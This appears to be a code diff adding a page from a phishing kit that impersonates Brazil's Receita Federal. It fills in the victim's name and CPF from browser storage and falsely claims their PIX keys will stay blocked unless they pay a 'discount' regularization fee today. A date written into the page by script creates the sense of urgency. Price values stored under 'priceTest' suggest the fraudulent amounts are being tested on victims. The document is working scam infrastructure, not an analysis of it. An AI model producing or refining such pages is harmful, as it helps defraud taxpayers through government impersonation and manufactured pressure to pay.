@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title>Regularização com Desconto - Receita Federal</title>
+    <link href="css/all.min.css" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-400.ea42a37247439622.woff2") format("woff2");
+        font-weight: 400;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-400i.1701033bc0b08320.woff2") format("woff2");
+        font-weight: 400;
+        font-style: italic;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-500.f8af4ec801afaa28.woff2") format("woff2");
+        font-weight: 500;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-600.844a17f0db94d147.woff2") format("woff2");
+        font-weight: 600;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-700.1c7c76152b40409f.woff2") format("woff2");
+        font-weight: 700;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-800.5c5f78761d00551b.woff2") format("woff2");
+        font-weight: 800;
+        font-style: normal;
+      }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Rawline", sans-serif;
+      }
+      body {
+        background-color: #f8f9fa;
+        padding-top: 60px;
+        color: #333333;
+        font-size: 16px;
+        line-height: 1.5;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 8px 20px;
+        background-color: white;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        height: 60px;
+      }
+      .logo {
+        width: 140px;
+        height: auto;
+      }
+      .header-icons {
+        display: flex;
+        gap: 15px;
+      }
+      .header-icon {
+        font-size: 18px;
+        color: #0056b3;
+      }
+      .container {
+        max-width: 600px;
+        margin: 20px auto;
+        padding: 0 20px;
+        flex: 1;
+      }
+      .offer-card {
+        background: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        margin-bottom: 20px;
+        border-left: 4px solid #0c326f;
+      }
+      .payment-info {
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        margin: 20px 0;
+        border-left: 4px solid #dc3545;
+      }
+      .regularize-button {
+        width: 100%;
+        padding: 15px;
+        background-color: #28a745;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-weight: 600;
+        font-size: 16px;
+        cursor: pointer;
+        margin: 10px 0;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        text-decoration: none;
+      }
+      .regularize-button:hover {
+        background-color: #218838;
+        transform: translateY(-2px);
+      }
+      .footer {
+        background-color: #01205b;
+        color: white;
+        padding: 16px;
+        text-align: center;
+        margin-top: auto;
+      }
+      .footer-logo {
+        width: 100px;
+        margin: 0 auto 8px;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <img
+        alt="Logo da Receita Federal"
+        class="logo"
+        src="images/receitaAzul.svg"
+      />
+      <div class="header-icons">
+        <i class="fas fa-search header-icon"></i>
+        <i class="fas fa-question-circle header-icon"></i>
+        <i class="fas fa-adjust header-icon"></i>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="offer-card">
+        <h1
+          style="
+            color: #0c326f;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+          "
+        >
+          DESCONTO ESPECIAL DE REGULARIZAÇÃO
+        </h1>
+        <p style="text-align: center; color: #666; margin-bottom: 20px">
+          Identificamos que você não concluiu sua regularização. Por isso,
+          preparamos um desconto especial.
+        </p>
+      </div>
+
+      <div class="payment-info">
+        <h3 style="color: #0c326f; font-weight: 600; margin-bottom: 15px">
+          Detalhes do Desconto
+        </h3>
+        <p><strong>Nome:</strong> <span id="userName"></span></p>
+        <p><strong>CPF:</strong> <span id="userCpf"></span></p>
+        <p style="margin-top: 15px; color: #dc3545">
+          <strong>Valor Original:</strong> R$ 142,83
+        </p>
+        <p style="color: #28a745; font-size: 20px; margin-top: 5px">
+          <strong>Valor com 50% de Desconto:</strong> R$ 71,42
+        </p>
+      </div>
+
+      <div
+        style="
+          background: #fff3cd;
+          padding: 20px;
+          border-radius: 8px;
+          margin: 20px 0;
+          border: 1px solid #ffeeba;
+        "
+      >
+        <p style="color: #856404; font-weight: 600; margin-bottom: 10px">
+          <i class="fas fa-clock"></i>
+          DESCONTO POR TEMPO LIMITADO
+        </p>
+        <p>
+          Este desconto especial é válido apenas hoje,
+          <strong
+            ><script>
+              const hoje = new Date();
+              const dia = hoje.getDate().toString().padStart(2, "0");
+              const mes = (hoje.getMonth() + 1).toString().padStart(2, "0");
+              const ano = hoje.getFullYear();
+              document.write(`${dia}/${mes}/${ano}`);
+            </script></strong
+          >. Após este prazo, o valor retornará ao normal e suas chaves PIX
+          permanecerão bloqueadas.
+        </p>
+      </div>
+
+      <a
+        href="../payment-retornou/index.html"
+        class="regularize-button"
+        style="text-align: center; justify-content: center"
+      >
+        <i class="fas fa-check-circle"></i>
+        <span style="flex: 1; text-align: center"
+          >APROVEITAR DESCONTO E REGULARIZAR AGORA</span
+        >
+      </a>
+    </div>
+
+    <footer class="footer">
+      <img
+        src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview"
+        alt="Receita Federal Logo"
+        class="footer-logo"
+      />
+      <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // Recuperar dados do usuário do localStorage
+        const userData = JSON.parse(localStorage.getItem("userData") || "{}");
+
+        // Função para formatar CPF
+        function formatCPF(cpf) {
+          cpf = cpf.replace(/\D/g, "");
+          return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        }
+
+        // Recuperar dados do teste de preço
+        const priceTest = JSON.parse(
+          localStorage.getItem("priceTest") ||
+            '{"principal": 14283, "retorno": 7142, "grupo": "C"}'
+        );
+
+        // Atualizar valores na página
+        document.querySelector(".payment-info").innerHTML = `
+          <h3 style="color: #0c326f; font-weight: 600; margin-bottom: 15px;">Detalhes do Desconto</h3>
+          <p><strong>Nome:</strong> ${userData.nome}</p>
+          <p><strong>CPF:</strong> ${formatCPF(userData.cpf)}</p>
+          <p style="margin-top: 15px; color: #dc3545;">
+            <strong>Valor Original:</strong> R$ ${(priceTest.principal / 100)
+              .toFixed(2)
+              .replace(".", ",")}
+          </p>
+          <p style="color: #28a745; font-size: 20px; margin-top: 5px;">
+            <strong>Valor com 50% de Desconto:</strong> R$ ${(
+              priceTest.retorno / 100
+            )
+              .toFixed(2)
+              .replace(".", ",")}
+          </p>
+        `;
+      });
+    </script>
+  </body>
+</html>
